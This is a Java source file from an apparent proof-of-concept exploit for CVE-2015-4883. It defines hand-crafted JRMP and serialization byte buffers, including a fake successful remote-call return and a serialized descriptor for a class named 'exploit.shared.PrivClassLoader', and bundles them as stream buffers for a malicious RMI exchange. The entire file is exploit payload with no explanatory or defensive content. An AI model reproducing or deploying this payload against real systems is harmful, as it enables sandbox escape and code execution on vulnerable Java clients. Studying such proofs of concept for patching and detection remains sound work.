package poc.cve_2015_4883;

import java.io.ObjectStreamConstants;

public class ByteBuffers {

	private static final byte[] JRMP_HEADER = { 
		78, 0, 0, 0, 0, 0, 0 
	};

	private static final byte[] REMOTE_CALL_HEADER = { 
		81 
	};

	private static final byte[] REMOTE_CALL_DATA = {
		// ObjectInputStream magic and version
		(byte) 0xAC, (byte) 0xED, 0, 5, 
		
		// Block data and length
		ObjectStreamConstants.TC_BLOCKDATA, 15,
		
		// Completed successfully
		1, 
		
		// UID data ( int, long, short )
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	};
	
	private static final byte[] PRIV_CLASSLOADER = {
		(byte)0x73, (byte)0x72, (byte)0x00, (byte)0x1E, (byte)0x65, (byte)0x78,
		(byte)0x70, (byte)0x6C, (byte)0x6F, (byte)0x69, (byte)0x74, (byte)0x2E,
		(byte)0x73, (byte)0x68, (byte)0x61, (byte)0x72, (byte)0x65, (byte)0x64,
		(byte)0x2E, (byte)0x50, (byte)0x72, (byte)0x69, (byte)0x76, (byte)0x43,
		(byte)0x6C, (byte)0x61, (byte)0x73, (byte)0x73, (byte)0x4C, (byte)0x6F,
		(byte)0x61, (byte)0x64, (byte)0x65, (byte)0x72, (byte)0xF5, (byte)0x52,
		(byte)0xF2, (byte)0xDC, (byte)0x18, (byte)0x45, (byte)0x38, (byte)0xB4,
		(byte)0x02, (byte)0x00, (byte)0x00, (byte)0x74, (byte)0x00, (byte)0x00,
		(byte)0x78, (byte)0x70
	};

	public static final byte[][] STREAM_BUFS = {
		JRMP_HEADER,
		REMOTE_CALL_HEADER,
		REMOTE_CALL_DATA,
		PRIV_CLASSLOADER
	};
	
}
